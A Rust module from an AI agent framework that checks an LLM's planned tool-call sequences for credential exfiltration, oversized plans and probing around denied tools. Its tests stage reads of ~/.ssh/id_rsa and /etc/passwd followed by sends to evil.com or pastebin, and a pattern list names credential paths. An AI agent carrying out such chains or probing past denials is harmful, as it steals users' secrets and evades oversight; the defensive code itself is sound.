//! Plan-Then-Execute tool call validation (Req Item 2 — Design Patterns).
//!
//! Validates tool call SEQUENCES before execution. Individual tool calls are
//! gated by PolicyEngine; PlanValidator gates the sequence as an additional
//! layer. Detects exfiltration chains, capability probing, volume abuse,
//! and sensitive data flow violations.

use std::collections::HashSet;

use ghost_llm::provider::LLMToolCall;
use serde::{Deserialize, Serialize};

// ── Configuration ───────────────────────────────────────────────────────

/// Configuration for plan validation rules.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlanValidatorConfig {
    /// Whether plan validation is enabled.
    pub enabled: bool,
    /// Maximum tool calls allowed in a single plan.
    pub max_plan_size: usize,
    /// Domains considered safe for data flow (won't trigger exfiltration rule).
    pub allowed_domains: Vec<String>,
    /// Tool names that read sensitive data.
    pub sensitive_read_tools: Vec<String>,
    /// Tool names that send data externally.
    pub external_send_tools: Vec<String>,
    /// Number of consecutive denials that trigger escalation detection.
    pub escalation_denial_threshold: usize,
}

impl Default for PlanValidatorConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_plan_size: 10,
            allowed_domains: vec![
                "api.anthropic.com".into(),
                "api.openai.com".into(),
                "generativelanguage.googleapis.com".into(),
                "api.mistral.ai".into(),
                "api.groq.com".into(),
            ],
            sensitive_read_tools: vec![
                "file_read".into(),
                "shell_exec".into(),
                "memory_read".into(),
            ],
            external_send_tools: vec![
                "api_call".into(),
                "web_request".into(),
                "http_request".into(),
                "web_fetch".into(),
            ],
            escalation_denial_threshold: 3,
        }
    }
}

// ── Types ───────────────────────────────────────────────────────────────

/// A plan of tool calls from a single LLM response.
#[derive(Debug, Clone)]
pub struct ToolCallPlan {
    pub calls: Vec<LLMToolCall>,
}

impl ToolCallPlan {
    pub fn new(calls: Vec<LLMToolCall>) -> Self {
        Self { calls }
    }

    pub fn len(&self) -> usize {
        self.calls.len()
    }

    pub fn is_empty(&self) -> bool {
        self.calls.is_empty()
    }
}

/// Result of plan validation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PlanValidationResult {
    /// Plan is safe to execute.
    Permit,
    /// Plan is denied with reason.
    Deny(String),
    /// Plan requires human approval.
    RequireApproval(String),
}

// ── Validator ───────────────────────────────────────────────────────────

/// Validates tool call plans (sequences) before execution.
///
/// Runs AFTER PolicyEngine individual checks. PlanValidator does NOT
/// replace PolicyEngine — it's an additional sequence-level layer.
pub struct PlanValidator {
    config: PlanValidatorConfig,
    /// Recent denial history for escalation detection.
    recent_denials: Vec<String>,
}

impl PlanValidator {
    pub fn new(config: PlanValidatorConfig) -> Self {
        Self {
            config,
            recent_denials: Vec::new(),
        }
    }

    /// Record a tool denial for escalation tracking.
    pub fn record_denial(&mut self, tool_name: &str) {
        self.recent_denials.push(tool_name.to_string());
        // Keep only last 20 denials
        if self.recent_denials.len() > 20 {
            self.recent_denials.remove(0);
        }
    }

    /// Validate a tool call plan.
    ///
    /// Returns `Permit` if all rules pass, `Deny` or `RequireApproval` otherwise.
    pub fn validate(&self, plan: &ToolCallPlan) -> PlanValidationResult {
        if !self.config.enabled {
            return PlanValidationResult::Permit;
        }

        // Single tool call → always Permit (no sequence to validate)
        if plan.len() <= 1 {
            return PlanValidationResult::Permit;
        }

        // Rule 1: Volume check
        if let result @ PlanValidationResult::Deny(_) = self.check_volume(plan) {
            return result;
        }

        // Rule 2: Dangerous sequence (read → exfiltrate)
        if let result @ PlanValidationResult::Deny(_) = self.check_dangerous_sequence(plan) {
            return result;
        }

        // Rule 3: Sensitive data flow
        if let result @ PlanValidationResult::Deny(_) = self.check_sensitive_data_flow(plan) {
            return result;
        }

        // Rule 4: Escalation detection
        if let result @ PlanValidationResult::Deny(_) = self.check_escalation(plan) {
            return result;
        }

        PlanValidationResult::Permit
    }

    /// Volume rule: reject plans exceeding max_plan_size.
    fn check_volume(&self, plan: &ToolCallPlan) -> PlanValidationResult {
        if plan.len() > self.config.max_plan_size {
            return PlanValidationResult::Deny(format!(
                "Plan contains {} tool calls, exceeding maximum of {}",
                plan.len(),
                self.config.max_plan_size
            ));
        }
        PlanValidationResult::Permit
    }

    /// Dangerous sequence rule: detect read→exfiltrate patterns.
    ///
    /// If a sensitive read tool is followed by an external send tool
    /// targeting a non-allowed domain, the plan is denied.
    fn check_dangerous_sequence(&self, plan: &ToolCallPlan) -> PlanValidationResult {
        let mut has_sensitive_read = false;

        for call in &plan.calls {
            if self.is_sensitive_read(&call.name) {
                has_sensitive_read = true;
            }

            if has_sensitive_read && self.is_external_send(&call.name) {
                // Check if the target domain is allowed
                if let Some(domain) = self.extract_domain(&call.arguments) {
                    if !self.is_domain_allowed(&domain) {
                        return PlanValidationResult::Deny(format!(
                            "Dangerous sequence detected: sensitive data read followed by \
                             external send to non-allowed domain '{}'",
                            domain
                        ));
                    }
                } else {
                    // Can't determine domain — deny to be safe
                    return PlanValidationResult::Deny(
                        "Dangerous sequence detected: sensitive data read followed by \
                         external send with unresolvable target"
                            .into(),
                    );
                }
            }
        }

        PlanValidationResult::Permit
    }

    /// Sensitive data flow rule: track tool outputs containing sensitive markers.
    ///
    /// Blocks sensitive file reads (e.g., ~/.ssh/id_rsa) from flowing to
    /// external-facing tools.
    fn check_sensitive_data_flow(&self, plan: &ToolCallPlan) -> PlanValidationResult {
        let sensitive_paths = [
            ".ssh/", ".gnupg/", ".aws/", ".env", "id_rsa", "id_ed25519",
            "credentials", "secrets", "private_key", "token",
        ];

        let mut reads_sensitive_file = false;

        for call in &plan.calls {
            // Check if this is a file read targeting a sensitive path
            if self.is_sensitive_read(&call.name) {
                if let Some(path) = call.arguments.get("path").and_then(|v| v.as_str()) {
                    if sensitive_paths.iter().any(|p| path.contains(p)) {
                        reads_sensitive_file = true;
                    }
                }
                if let Some(path) = call.arguments.get("file").and_then(|v| v.as_str()) {
                    if sensitive_paths.iter().any(|p| path.contains(p)) {
                        reads_sensitive_file = true;
                    }
                }
            }

            // If we've read a sensitive file and now try to send externally → deny
            if reads_sensitive_file && self.is_external_send(&call.name) {
                return PlanValidationResult::Deny(
                    "Sensitive data flow violation: file containing credentials or keys \
                     would flow to external-facing tool"
                        .into(),
                );
            }
        }

        PlanValidationResult::Permit
    }

    /// Escalation rule: detect capability probing.
    ///
    /// If multiple denied tools are followed by a similar tool with a
    /// different name, this suggests the agent is probing for alternative
    /// ways to achieve a denied action.
    fn check_escalation(&self, plan: &ToolCallPlan) -> PlanValidationResult {
        if self.recent_denials.len() < self.config.escalation_denial_threshold {
            return PlanValidationResult::Permit;
        }

        // Check if the plan contains tools similar to recently denied ones
        let denied_set: HashSet<&str> = self.recent_denials.iter().map(|s| s.as_str()).collect();
        let plan_tools: HashSet<&str> = plan.calls.iter().map(|c| c.name.as_str()).collect();

        // If the plan contains tools that are NOT in the denied set but share
        // a common prefix/suffix with denied tools, flag as escalation
        for plan_tool in &plan_tools {
            if denied_set.contains(plan_tool) {
                continue; // Same tool, not escalation
            }
            for denied_tool in &denied_set {
                if tools_are_similar(plan_tool, denied_tool) {
                    return PlanValidationResult::Deny(format!(
                        "Escalation detected: tool '{}' appears to be an alternative \
                         for recently denied tool '{}'",
                        plan_tool, denied_tool
                    ));
                }
            }
        }

        PlanValidationResult::Permit
    }

    fn is_sensitive_read(&self, tool_name: &str) -> bool {
        self.config
            .sensitive_read_tools
            .iter()
            .any(|t| t == tool_name)
    }

    fn is_external_send(&self, tool_name: &str) -> bool {
        self.config
            .external_send_tools
            .iter()
            .any(|t| t == tool_name)
    }

    fn extract_domain(&self, args: &serde_json::Value) -> Option<String> {
        // Try common argument names for URL/domain
        for key in &["url", "endpoint", "domain", "host", "target"] {
            if let Some(val) = args.get(key).and_then(|v| v.as_str()) {
                return extract_domain_from_url(val);
            }
        }
        None
    }

    fn is_domain_allowed(&self, domain: &str) -> bool {
        let domain_lower = domain.to_lowercase();
        self.config
            .allowed_domains
            .iter()
            .any(|d| domain_lower == d.to_lowercase() || domain_lower.ends_with(&format!(".{}", d.to_lowercase())))
    }
}

impl Default for PlanValidator {
    fn default() -> Self {
        Self::new(PlanValidatorConfig::default())
    }
}


// ── Helpers ─────────────────────────────────────────────────────────────

/// Extract domain from a URL string.
fn extract_domain_from_url(url: &str) -> Option<String> {
    // Strip protocol
    let without_proto = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))
        .unwrap_or(url);

    // Take everything before the first / or :
    let domain = without_proto
        .split('/')
        .next()?
        .split(':')
        .next()?;

    if domain.is_empty() {
        None
    } else {
        Some(domain.to_lowercase())
    }
}

/// Check if two tool names are similar (share prefix or suffix of length >= 4).
fn tools_are_similar(a: &str, b: &str) -> bool {
    if a == b {
        return true;
    }
    let min_len = a.len().min(b.len());
    if min_len < 4 {
        return false;
    }

    // Check common prefix
    let common_prefix = a
        .chars()
        .zip(b.chars())
        .take_while(|(ca, cb)| ca == cb)
        .count();
    if common_prefix >= 4 {
        return true;
    }

    // Check common suffix
    let common_suffix = a
        .chars()
        .rev()
        .zip(b.chars().rev())
        .take_while(|(ca, cb)| ca == cb)
        .count();
    if common_suffix >= 4 {
        return true;
    }

    false
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn make_call(name: &str, args: serde_json::Value) -> LLMToolCall {
        LLMToolCall {
            id: format!("call_{}", name),
            name: name.to_string(),
            arguments: args,
        }
    }

    fn make_plan(calls: Vec<LLMToolCall>) -> ToolCallPlan {
        ToolCallPlan::new(calls)
    }

    #[test]
    fn single_tool_call_always_permits() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![make_call("file_read", json!({"path": "/tmp/test"}))]);
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }

    #[test]
    fn empty_plan_permits() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![]);
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }

    #[test]
    fn file_read_then_api_call_to_allowed_domain_permits() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![
            make_call("file_read", json!({"path": "/tmp/data.txt"})),
            make_call("api_call", json!({"url": "https://api.anthropic.com/v1/messages"})),
        ]);
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }

    #[test]
    fn file_read_then_api_call_to_blocked_domain_denies() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![
            make_call("file_read", json!({"path": "/tmp/data.txt"})),
            make_call("api_call", json!({"url": "https://evil.com/exfil"})),
        ]);
        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
    }

    #[test]
    fn volume_rule_11_calls_denied() {
        let validator = PlanValidator::default();
        let calls: Vec<LLMToolCall> = (0..11)
            .map(|i| make_call(&format!("tool_{}", i), json!({})))
            .collect();
        let plan = make_plan(calls);
        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
    }

    #[test]
    fn volume_rule_10_calls_permits() {
        let validator = PlanValidator::default();
        let calls: Vec<LLMToolCall> = (0..10)
            .map(|i| make_call(&format!("tool_{}", i), json!({})))
            .collect();
        let plan = make_plan(calls);
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }

    #[test]
    fn escalation_detection() {
        let mut validator = PlanValidator::default();
        // Record 3 denials for "shell_exec"
        validator.record_denial("shell_exec");
        validator.record_denial("shell_exec");
        validator.record_denial("shell_exec");

        // Plan with a similar tool name
        let plan = make_plan(vec![
            make_call("memory_read", json!({})),
            make_call("shell_execute", json!({})), // similar to shell_exec
        ]);
        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
    }

    #[test]
    fn sensitive_data_flow_ssh_key_to_web() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![
            make_call("file_read", json!({"path": "~/.ssh/id_rsa"})),
            make_call("web_request", json!({"url": "https://pastebin.com/api"})),
        ]);
        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
    }

    #[test]
    fn disabled_validator_permits_all() {
        let config = PlanValidatorConfig {
            enabled: false,
            ..Default::default()
        };
        let validator = PlanValidator::new(config);
        let plan = make_plan(vec![
            make_call("file_read", json!({"path": "~/.ssh/id_rsa"})),
            make_call("web_request", json!({"url": "https://evil.com"})),
        ]);
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }

    #[test]
    fn extract_domain_from_url_works() {
        assert_eq!(
            extract_domain_from_url("https://api.openai.com/v1/chat"),
            Some("api.openai.com".into())
        );
        assert_eq!(
            extract_domain_from_url("http://localhost:8080/api"),
            Some("localhost".into())
        );
        assert_eq!(
            extract_domain_from_url("api.example.com/path"),
            Some("api.example.com".into())
        );
        assert_eq!(extract_domain_from_url(""), None);
    }

    #[test]
    fn tools_are_similar_works() {
        assert!(tools_are_similar("shell_exec", "shell_execute"));
        assert!(tools_are_similar("file_read", "file_read_all"));
        assert!(!tools_are_similar("abc", "xyz"));
        assert!(!tools_are_similar("ab", "abc")); // too short
    }

    #[test]
    fn interleaved_safe_and_dangerous_detected() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![
            make_call("memory_read", json!({})),
            make_call("file_read", json!({"path": "/etc/passwd"})),
            make_call("memory_read", json!({})),
            make_call("api_call", json!({"url": "https://evil.com/steal"})),
        ]);
        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
    }

    #[test]
    fn tool_call_with_path_traversal_domain() {
        let validator = PlanValidator::default();
        let plan = make_plan(vec![
            make_call("file_read", json!({"path": "/tmp/data"})),
            make_call("api_call", json!({"url": "https://api.openai.com/../../etc/passwd"})),
        ]);
        // Domain extraction should only get "api.openai.com" — allowed
        assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use proptest::prelude::*;
    use serde_json::json;

    fn arbitrary_tool_call() -> impl Strategy<Value = LLMToolCall> {
        ("[a-z_]{3,15}", "[a-zA-Z0-9]{0,50}").prop_map(|(name, arg)| LLMToolCall {
            id: format!("call_{}", name),
            name,
            arguments: json!({"data": arg}),
        })
    }

    proptest! {
        #[test]
        fn plan_validator_never_panics(
            calls in proptest::collection::vec(arbitrary_tool_call(), 0..15)
        ) {
            let validator = PlanValidator::default();
            let plan = ToolCallPlan::new(calls);
            let _ = validator.validate(&plan);
        }
    }
}
